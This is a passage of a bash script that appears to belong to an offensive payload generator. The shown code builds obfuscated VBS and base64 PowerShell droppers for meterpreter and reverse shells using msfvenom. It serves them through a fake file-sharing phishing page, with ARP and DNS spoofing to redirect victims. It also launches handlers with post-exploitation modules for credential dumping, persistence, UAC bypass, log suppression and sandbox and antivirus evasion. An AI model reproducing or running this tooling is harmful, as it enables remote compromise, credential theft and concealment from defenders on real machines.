] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n           else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\nfi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.bat > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n# --------------------------------------------------------\n# build shellcode in VBS (obfuscated using ANCII) \n# It was Working in 'Suryia Prakash' rat.vbs obfuscation\n# that led me here... (build a vbs obfuscated payload) :D\n# --------------------------------------------------------\nsh_shellcode13 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ VBS NAME ☠\" --text \"example: Prakash\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"Prakash\";fi\n\necho \"[☠] Building shellcode -> vbs format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : VBS -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f vbs > $IPATH/obfuscate/$N4m.vbs\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f vbs > $IPATH/obfuscate/$N4m.vbs\" > /dev/null 2>&1\nfi\n\n\ncat $IPATH/obfuscate/$N4m.vbs | grep '\"' | awk {'print $3'} | cut -d '=' -f1\n# obfuscating payload.vbs\necho \"[☠] Obfuscating sourcecode...\"\nsleep 2\ncd $IPATH/obfuscate/\nxterm -T \" VBS-OBFUSCATOR.PY \" -geometry 110x23 -e \"python vbs-obfuscator.py $N4m.vbs final.vbs\"\ncp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1\nrm $N4m.vbs > /dev/null 2>&1\necho \"[☠] Injecting shellcode -> $N4m.vbs!\"\nsleep 2\ncd $IPATH/\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"PAYLOAD STORED UNDER:\\n$IPATH/output/$N4m.vbs\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 180) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n       fi\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n# ZIP payload files before sending? (apache2)\nrUn=$(zenity --question --title=\"☠ SHELLCODE GENERATOR ☠\" --text \"Zip payload files?\" --width 270) > /dev/null 2>&1\n    if [ \"$?\" -eq \"0\" ]; then\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.zip|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      echo \"[☠] creating archive -> $N4m.zip\"\n      zip $N4m.zip $N4m.vbs > /dev/null 2>&1\n      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n    else\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.vbs|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n    fi\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/obfuscate/final.vbs > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nrm $ApAcHe/$N4m.vbs > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# ----------------------------------------------------\n# build shellcode in PSH-CMD (powershell base64 enc)\n# embbebed into one .vbs template\n# ----------------------------------------------------\nsh_shellcode14 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ SHELLCODE NAME ☠\" --text \"Enter shellcode output name\\nexample: notepad\" --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"notepad\";fi\n\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw\"\nfi\n\n\n# display shellcode\ndisp=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $disp\necho \"\"\nsleep 2\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\nsleep 2\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\nOBF=$(zenity --list --title \"☠ AGENT STRING OBFUSCATION ☠\" --text \"Obfuscate the agent [ template ] command arguments ?\\nUsing special escape characters, whitespaces, concaternation, amsi\\nsandbox evasion and variables piped and de-obfuscated at runtime\\n'The agent will delay is execution to evade sandbox detection (msgbox)'\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"None-Obfuscation (default)\" FALSE \"String Obfuscation (3 sec)\" --width 353 --height 245) > /dev/null 2>&1\n\n\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\n   # check if exec.vbs as generated\n   if [ -e $IPATH/templates/exec.vbs ]; then\n      echo \"[☠] exec.vbs  -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] exec.vbs  -> not found!\"\n      exit\n      fi\n\n# injecting shellcode into name\ncd $IPATH/templates/\necho \"[☠] Injecting shellcode -> $N4m.vbs!\"\nsleep 2\nsed \"s|InJ3C|$disp|\" exec.vbs > $N4m.vbs\nmv $N4m.vbs $IPATH/output/$N4m.vbs\nchmod +x $IPATH/output/$N4m.vbs\n\nelse\necho \"[✔] String obfuscation technic sellected ..\"\nsleep 2\necho \"[☠] Injecting shellcode -> $N4m.vbs!\"\nsleep 2\n#\n# STRING: powershell.exe -wIN 1 -noP -noNI -eN $disp\n#\necho \"dIm i0dIfQ,f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\\\"/wINe\\\"+\\\"NPoW\\\"&\\\"eR1nO\\\"+\\\"PSh\\\"&\\\"ElLn\\\"+\\\"oNI\\\":i0dIfQ=rEpLaCe(\\\"In\\\"&\\\"si0al\\\"+\\\"ling up\\\"&\\\"da\\\"+\\\"i0es.\\\",\\\"i0\\\",\\\"t\\\"):mSgbOx i0dIfQ:f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\\\" \\\"&mId(U1kJi0,1,4)&\\\" 1 \\\"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\\\" \\\"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\\\" \\\"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\\\" $disp\\\":sEt dIb0fQ=cReAtEObJeCt(\\\"\\\"+\\\"W\\\"&\\\"sCr\\\"+\\\"Ip\\\"&\\\"t.Sh\\\"+\\\"El\\\"&\\\"L\\\"):dIb0fQ.rUn f0wBiQ\" > $IPATH/output/$N4m.vbs\ncd $IPATH/output\nfi\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.vbs\\n\\nExecute: press 2 times to 'execute'\\n\\nchose how to deliver: $N4m.vbs\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.vbs on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.vbs|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.vbs|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.vbs|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo 